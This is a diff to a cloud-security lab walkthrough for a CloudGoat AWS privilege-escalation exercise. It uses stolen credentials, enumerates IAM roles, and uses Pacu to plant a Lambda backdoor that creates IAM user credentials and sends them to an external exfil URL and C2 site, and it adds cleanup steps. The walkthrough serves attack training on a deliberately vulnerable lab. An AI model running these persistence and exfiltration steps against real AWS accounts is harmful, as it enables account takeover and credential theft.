@@ -234,7 +234,7 @@ privileges.
     aws configure --profile chris
 
 -  Set the ``AWS Access Key ID`` and ``AWS Secret Access Key`` using the
-   stolen chris credentials 
+   stolen chris credentials (Chris was created by Cloudgoat)
 
 -  Set the “Default region” to ``us-east-1`` and the “Default output” format to
    ``json``
@@ -257,9 +257,9 @@ privileges.
 
     aws iam get-policy-version --policy-arn <ARN> --version-id v1 --profile chris 
 
-   The policy allows the user to assume and list roles
+The policy allows the user to assume and list roles
 
-- List the roles and copy the ``Role Name`` and ``ARN`` output to your text file
+- List the roles and copy the ``Role Name`` and ``ARN`` of the role name to your text file
 
 .. code:: console
 
@@ -379,8 +379,8 @@ For this part of the attack we will use Pacu
 -  List the Lambda functions with ``run lambda__enum``
 
 Create persistence with Lambda that creates a backdoor IAM user credentials.  This will require 2 inputs which you will need prior to proceeding
-- Role ARN from previous attack ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``
-- exfil-url ``https://commander-api.vectratme.com/adduser``
+   - Role ARN from previous attack ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``
+   - exfil-url ``https://commander-api.vectratme.com/adduser``
 
 Once you have the above values run the below in pacu.  You will be prompted for the ARN.
 
@@ -397,3 +397,18 @@ Persistence has been set. Lets create a new user to test it (you don't need to l
 Now let’s visit our C2 site https://commander.vectratme.com/ to verify.  You will need a logon provided by Vectra.
 
 image
+
+Lab Cleanup
+===========
+
+Exit pacu
+Delete Lambda functions
+There will be 2
+- aws lambda delete-function --function-name admin_function-<initials> 
+- Function created by Pacu
+
+Detach the policies from the user "chris".  This was added in a pervious step.
+
+aws iam  detach-user-policy --user-name <username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+Run cloudgoat destroy lambda_privesc
